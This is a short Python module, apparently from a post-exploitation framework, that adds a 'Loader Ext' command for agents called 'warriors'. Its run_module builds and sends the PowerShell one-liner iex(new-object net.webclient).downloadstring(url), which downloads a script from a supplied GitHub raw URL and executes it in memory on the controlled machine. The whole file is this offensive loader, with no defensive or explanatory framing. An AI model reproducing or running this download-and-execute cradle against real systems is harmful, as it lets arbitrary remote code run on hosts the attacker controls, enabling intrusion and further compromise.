from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Loader Ext",
                       "Description": "Load any function (GitHub RAW Repository)",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "url": [None, "RAW URL Github Repo", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = 'iex(new-object net.webclient).downloadstring("{}")'.format(self.args["url"])
        #function += 'loaderext -url "{}"'.format(self.args["url"])
        super(CustomModule, self).run(function)
